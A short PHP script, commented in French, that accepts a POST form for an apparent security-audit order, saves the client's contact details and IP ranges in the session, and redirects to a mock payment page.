<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    http_response_code(405);
    exit("Méthode non autorisée");
}

// Nettoyage et enregistrement des champs
$_SESSION['client_data'] = [
    'company' => $_POST['company'] ?? '',
    'firstName' => $_POST['firstName'] ?? '',
    'lastName' => $_POST['lastName'] ?? '',
    'email' => $_POST['email'] ?? '',
    'phone' => $_POST['phone'] ?? '',
    'ipRanges' => $_POST['ipRanges'] ?? [],
    'date' => date('c') // format ISO
];

// Redirection vers la fausse page de paiement
header("Location: ../audit/paiement/index.html");
exit;
